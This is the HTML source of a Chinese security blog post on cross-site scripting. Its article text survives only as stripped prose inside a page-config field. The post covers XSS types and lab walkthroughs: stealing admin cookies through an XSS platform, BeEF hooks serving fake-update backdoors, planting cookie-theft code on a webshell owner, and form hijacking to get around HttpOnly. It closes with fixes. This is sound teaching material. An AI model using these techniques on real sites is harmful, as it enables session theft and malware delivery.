<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>XSS 跨站漏洞 | Jackhou Blog</title><meta name="keywords" content="安全,XSS"><meta name="author" content="Jack hou"><meta name="copyright" content="Jack hou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="XSS 跨站漏洞"><meta name="application-name" content="XSS 跨站漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="XSS 跨站漏洞"><meta property="og:url" content="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/index.html"><meta property="og:site_name" content="Jackhou Blog"><meta property="og:description" content="一、XSS 跨站漏洞（1）XSS 简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg"><meta property="article:author" content="Jack hou"><meta property="article:tag" content="Jackhou, blog"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg"><meta name="description" content="一、XSS 跨站漏洞（1）XSS 简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://twikoo.houyanbin.com/',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: {"apiurl":null},
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Jack hou","link":"链接: ","source":"来源: Jackhou Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#3b70fc","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Jackhou Blog',
  title: 'XSS 跨站漏洞',
  postAI: '',
  pageFillDescription: '一、XSS 跨站漏洞, （1）XSS 简介, （2）产生层面, （3）函数类, （4）危害影响, （5）浏览器内核版本, （6）常出现场景, 二、XSS 攻击的分类, （1）来自内部的攻击, （2）来自外部的攻击, 三、XSS 的分类, 1、反射型 (非持久化), （1）原理, （2）攻击方式, （3）判断是否存在反射型 xss 漏洞并利用, ① 判断有没有过滤一些特殊的字符, ② 注入代码, ③ 插入代码, ④ 利用 xss 漏洞, 2、存储型 (持久化), （1）原理, （2）攻击方式, （3）payload, 3、DOM 型, （1）原理, （2）攻击方式, （3）payload, 四、XSS 攻击的途径, 五、靶场实战, 1、PHP 开源多功能留言板, （1）搭建靶场, （2）XSS 平台, （3）进行攻击, ① 初次尝试, ② 绕过ltscriptgt检测, ③ 利用 XSS 平台获取 cookie, ④ 使用 firebug 登录后台, 2、BUUCTF-basic-BUU XSS COURSE 1, 3、订单系统——军锋真人 CS 野战 123, （1）靶场下载, （2）靶场安装, （3）进行攻击, ① 初次尝试, ② XSS 平台获取 cookie, ③ postman 登录后台, （4）Beef 结合 XSS 攻击, ① 安装 Beef-xss, ② 使用 beef-xss, 4、WebShell 箱子管理系统, （1）搭建靶场, ① 靶场下载, ② 小旋风下载, ③ 靶场搭建, （2）进行攻击, ① 模拟 webshell 原作者进行后门攻击, ② 反杀 webshell 原作者, 5、使用 JS 代码获取 Cookie, 六、XSS 攻击的检测, 七、获取 Session 思路, 八、HttpOnly, 1、什么是 HttpOnly, 2、HttpOnly 的设置样例, （1）JavaEE, （2）C, （3）VB.NET, （4）PHP≥5.2, （5）PHP4 和 PHP≤5.1, 3、反制 HttpOnly, （1）Cookie 形式, （2）直接账号密码登录, ① 读取保存账号密码, ② 读取没保存账号密码, 九、安全修复方案一跨站漏洞简介网站中包含大量的动态内容以提高用户体验比过去要复杂得多所谓动态内容就是根据用户环境和需要应用程序能够输出相应的内容动态站点会受到一种名为跨站脚本攻击安全专家们通常将其缩写成原本应当是但为了和层叠样式表有所区分故称的威胁而静态站点则完全不受其影响恶意攻击者会在页面里插入恶意代码当用户浏览该页之时嵌入其中里面的代码会被执行从而达到恶意攻击用户的目的跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术是代码注入的一种它允许恶意用户将代码注入网页其他用户在浏览网页时会受到影响恶意用户利用代码攻击成功后可能得到很高的权限私密网页内容会话和等各种内容攻击者利用漏洞旁路掉访问控制例如同源策略这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼攻击而变得广为人知对于跨站脚本攻击黑客界共识是跨站脚本攻击是新型的缓冲区溢出攻击而是新型的漏洞通常是通过的输出函数将代码输出到页面中通过用户本地浏览器执行的所以漏洞关键就是寻找参数未过滤的输出函数产生层面产生层面一般都是在前端代码能干什么执行之后就会达到相应的效果函数类比如说中的脚本的输出函数常见的输出函数有危害影响盗取各类用户帐号如机器登录帐号用户网银帐号各类管理员帐号控制企业数据包括读取篡改添加删除企业敏感数据的能力盗窃企业重要的具有商业价值的资料非法转账强制发送电子邮件网站挂马控制受害者机器向其它网站发起攻击其实归根结底的攻击方式就是想办法教唆用户的浏览器去执行一些这个网页中原本不存在的前端代码可问题在于尽管一个信息框突然弹出来并不怎么友好但也不至于会造成什么真实伤害啊的确如此但要说明的是这里拿信息框说事仅仅是为了举个栗子真正的黑客攻击在中除非恶作剧不然是不会在恶意植入代码中写上的在真正的应用中攻击可以干的事情还有很多这里举两个例子窃取网页浏览中的值在网页浏览中我们常常涉及到用户登录登录完毕之后服务端会返回一个值这个值相当于一个令牌拿着这张令牌就等同于证明了你是某个用户如果你的值被窃取那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户如果想要通过脚本获得当前页面的值通常会用到试想下如果像空间说说中能够写入攻击语句那岂不是看了你说说的人的号你都可以登录不过貌似的有其他验证措施保证同一不能被滥用劫持流量实现恶意跳转这个很简单就是在网页中想办法插入一句像这样的语句那么所访问的网站就会被跳转到百度的首页早在年新浪就曾爆出过严重的漏洞导致大量用户自动关注某个微博号并自动转发某条微博具体各位可以自行百度浏览器内核版本利用需要浏览器版本和内核没有过滤攻击比如用谷歌火狐等打开可以成功但是却会拦截常出现场景文章发表评论留言注册资料的地方修改资料的地方等二攻击的分类攻击分成两类一类是来自内部的攻击另一类则是来自外部的攻击来自内部的攻击主要指的是利用程序自身的漏洞构造跨站语句如的存在的跨站漏洞来自外部的攻击主要指的自己构造跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页如当我们要渗透一个站点我们自己构造一个有跨站漏洞的网页然后构造跨站语句通过结合其它技术如社会工程学等欺骗目标服务器的管理员打开三的分类反射型非持久化原理反射型又称非持久型是目前最普遍的类型这种攻击方式往往具有一次性发出请求时代码出现在中作为输入提交到服务器端服务器端解析后响应代码随响应内容一起传回给浏览器最后浏览器解析执行代码这个过程像一次反射所以称反射型攻击方式攻击者通过电子邮件等方式将包含代码的恶意链接发送给目标用户当目标用户访问该链接时服务器接受该用户的请求并进行处理然后服务器把带有代码的数据发送给目标用户的浏览器浏览器解析这段带有代码的恶意脚本后就会触发漏洞判断是否存在反射型漏洞并利用判断有没有过滤一些特殊的字符比如对比输出的字符和输出的字符可以看到有些字符被过滤了注入代码下面是大概的原理假如我输入的是提交后点击查看网页源代码插入代码如果读取图片失败则用显示相关信息显示了信息则说明存在注入可以对比看到通过前面的闭合以及后面的代码插入读取不到图片因此触发了弹窗显示了括号内的内容即利用漏洞将刚刚成功注入代码并能触发的网址通过电子邮件等方式发送给对方的手中如果结合平台对方点击了链接就能得到对方的等信息存储型持久化原理存储型和反射型的差别仅在于提交的代码会存储在服务器端数据库内存文件系统等下次请求目标页面时不用再提交代码最典型的例子就是留言板用户提交一条包含代码的留言存储到数据库目标用户查看留言板时那些留言就会从数据库中加载出来并显示于是触发了攻击攻击方式这种攻击多见于论坛博客和留言板中攻击者在发帖的过程中将恶意脚本连同正常的信息一起注入帖子的内容中随着帖子被服务器存储下来恶意脚本也永久的存放在服务器的后端存储器中当其他用户浏览这个被注入了恶意脚本的帖子时恶意脚本会在它们的浏览器中得到执行注入后重新刷新发现直接回显注入的东西说明是存储型型原理文档对象模型是一个与平台编程语言不相干的接口允许程序或脚本动态地访问和更新文档内容结构和样式处理后的结果会成为展示页面的一部分型其实是一种特殊类型的反射型也被称作本地跨站它是基于文档对象模型的一种漏洞和反射型存储型的区别在于代码并不需要服务器参与出发靠的是浏览器的解析完全是客户端的事情中有很多对象其中一些对象可以被用户所操纵如等客户端的脚本程序可以通过来动态地检查和修改页面内容它不依赖于提交数据到服务器端而是从客户端取得中的数据后并在本地执行因此仅从服务器端是没有办法防御型漏洞的如若中的数据没有经过严格的验证便会产生基于的漏洞基于的是反射的特例其中隐藏在中并在其呈现时由页面中的取出而不是在提供服务时嵌入到页面中这可以使其比其他攻击更隐蔽并且监控页面正文的或其他防护检测不出恶意内容攻击方式用户请求一个经过专门设计的它由攻击者提交而且其中包含代码服务器的响应不会以任何的形式包含攻击者的脚本当用户的浏览器处理这个响应时对象就会处理代码导致存在漏洞四攻击的途径攻击方法只是利用的属性做各种尝试找出注入的方法现在对三种攻击的主要方式进行分析第一种对普通的用户输入页面原样输出攻击者通过对的伪装经过某些特定的操作就会跳出一个木马界面从而取得登录用户的第二种在代码区内存在有用户输入的内容第三种允许用户输入标签的页面用户可以提交一些自定义的代码五靶场实战开源多功能留言板搭建靶场开源多功能留言板下载地址按照教程安装即可平台网址网址网址网址进行攻击初次尝试尝试用简单的代码进行攻击存在过滤绕过检测使用以下语句绕过过滤成功弹出弹窗管理员后台查看也会弹出弹窗而弹出弹窗的原因就是这句代码嵌入到了代码中利用平台获取此时利用平台启用默认模块因为这个留言板会过滤标签因此我选择使用标签进行攻击发送成功管理员到后台查看留言此时平台就有记录了使用登录后台获取到访问的用获取到的和后台链接使用进行设置成功进入后台注意因为是留言板因此别人查看我们留下的攻击代码时也会记录到平台因此查看平台的记录时注意甄别访客和管理员订单系统军锋真人野战靶场下载链接提取码靶场安装注意下载安装好后仔细查看安装说明比如的数据库账密要对否则连接不上数据库如果访问提示以下信息按照提示操作即可在真实机部署环境时出现了一系列问题后台登录页面验证码无法显示我是在虚拟机版本为部署成功的进行攻击初次尝试攻击者在具体要求一栏构造管理员在后台进行查看时就会弹出弹窗正是因为我们的代码嵌入到了其中平台获取选择平台的攻击代码提交管理员在后台查看时就会触发攻击代码此时在平台就能查看到获取的信息登录后台下载地址结合攻击安装最新版安装如果遇到找不到包解决方案编辑文件添加旧的资源信息更新资源列表更新完毕后重新安装目标应用即可安装完成后直接使用启动会有启动失败的问题目前还不知道解决方法但是可以进入目录使用启动即可如果需要修改登录账号密码可以修改文件使用启动后插入钩子提交后台管理员查看订单触发成功上线获取浏览器跳转社工攻击利用模拟更新向客户端发送请求来实现下载后门客户端显示点击就下载后门箱子管理系统就是使用别人的来进行获取服务器但获取后存在的恶意代码就会把网站信息和密码和用户名发到的原主人来进行信息收集通过大量获取的网站来进行贩卖而使用的人就成打工仔了反杀的意思就是像上面的窃取道理一样通过向的代码中插入窃取的代码当原注入查看沙箱时就会触发窃取来达到反客为主既然说到了推荐一个库搭建靶场靶场下载靶场下载链接提取码小旋风下载搭建一个的服务器我们这里选用小旋风进行搭建下载完成后解压到虚拟机里面默认端口为如果端口被占用或不想用可用记事本打开增加端口网站服务靶场搭建将下载好的箱子放在搭建好的服务器里面这里我放到了端口下这里存在一个问题访问该网址时只能访问访问或者内网地址都会报的错误经过排查终于知道是哪里出了问题只需要将这里修改成对应的地址重启服务即可假如我们向传入了别人留了后门的木马进行连接访问了这个时候别人在后台就能看到我们的坐收渔翁之利进行攻击模拟原作者进行后门攻击登录后台账号密码都为去找一个免杀然后加上我自己的后门当前请求头中项的内容当前执行脚本的文件名模拟上传到某网站并且进行连接触发后门这时我们就打开箱子发现我们的后门了实验时发现木马路径太长即使触发了后门也无法记录到箱子中去反杀原作者有的原作者会利用加密编码拼接字符等技术来隐藏因此我们使用别人的时一定要进行代码审计当我们代码审计获取到沙箱的后通过访问沙箱来植入代码窃取此时沙箱管理员查看信封就会看到我们的恶意数据同时也会触发攻击代码平台新增记录使用进入后台直接反杀使用代码获取六攻击的检测在目标站点上找到输入点比如搜索栏错误页面留言板等输入一组特殊字符唯一识别字符点击提交后查看返回源码是否做对应的处理通过搜索定位到唯一识别字符结合唯一识别字符前后语法确认是否可以构造执行的条件构造闭合提交构造的脚本代码以及各种绕过姿势看是否可以成功执行如果成功执行则说明该站点存在漏洞通常搜索栏容易出现反射型留言板容易出现存储型有些网站鉴于后台可能存在过滤措施组建的可能会被过滤掉因而无法生效或者环境限制脚本执行通过变化不同的尝试绕过后台的过滤机制下图为跨站脚本攻击流程图从图中可以看出用户访问存在漏洞的站点后触发脚本漏洞站点给用户返回带有恶意的页面用户设备执行该恶意脚本后攻击者即可窃取用户的数据并伪装成用户对漏洞站点进行攻击七获取思路有的时候获取了但是少了会造成登不进后台服务器开启了验证的话我们只获取客户端的是没有办法通过验证的而且我们也无法获取存放在服务端的如果需要获取可以借助辅助文件比如访问探针时就会携带如果能利用让管理员页面跳转到界面通过返回源码就能窃取利用进行页面跳转获取页面源码获取源码中的和八什么是如果中设置了属性那么通过脚本将无法读取到信息这样能有效防止攻击窃取内容但是还是存在跨站语句阻止的仅仅是获取各个主流的脚本语言都支持的设置样例具体参数的含义再次不做阐述设置完毕后通过脚本是读不到该的但使用如下方式可以读取但是在中您需要手动添加以上版本已支持参数的设置同样也支持全局的的设置在中设置其值为或者来开启全局的的属性当然也支持在代码中来开启操作函数函数和函数也专门添加了第个参数来做为的选项开启方法为和对于以前版本以及版本的话则需要通过函数来变通下了反制当对方开启时盗取就会失败登录后台的方式有登录和账号密码登录形式直接账号密码登录读取保存账号密码通过窃取保存在本地的数据账号密码来登录后台需要产生于登录地址利用表单劫持通过查看网站源代码中的登录框表单读取没保存账号密码通过表单登录框劫持数据产生在后台的例如存储型留言等劫持原理抓取数据包另外发送一份到跨站平台但是如果是网站的话数据是进行了加密获取了数据之后也是很难读取到账号密码的鸡肋方法九安全修复方案开启过滤输入对输入进行过滤不允许可能导致攻击的字符输入过滤输出根据输出点的位置对输出到前端的内容进行适当转义被阻断关于漏洞修复',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-21 01:44:10',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://www.houyanbin.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">Jackhou Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=8868465080&amp;server=tencent&amp;type=0"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" target="_blank"><img class="post-qr-code-img" alt="wechat" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" target="_blank"><img class="post-qr-code-img" alt="alipay" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Article/" style="font-size: 1.05rem;">Article<sup>4</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem;">CSRF<sup>1</sup></a><a href="/tags/Git/" style="font-size: 1.05rem;">Git<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>3</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>17</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/Pikachu/" style="font-size: 1.05rem;">Pikachu<sup>1</sup></a><a href="/tags/SQL/" style="font-size: 1.05rem;">SQL<sup>2</sup></a><a 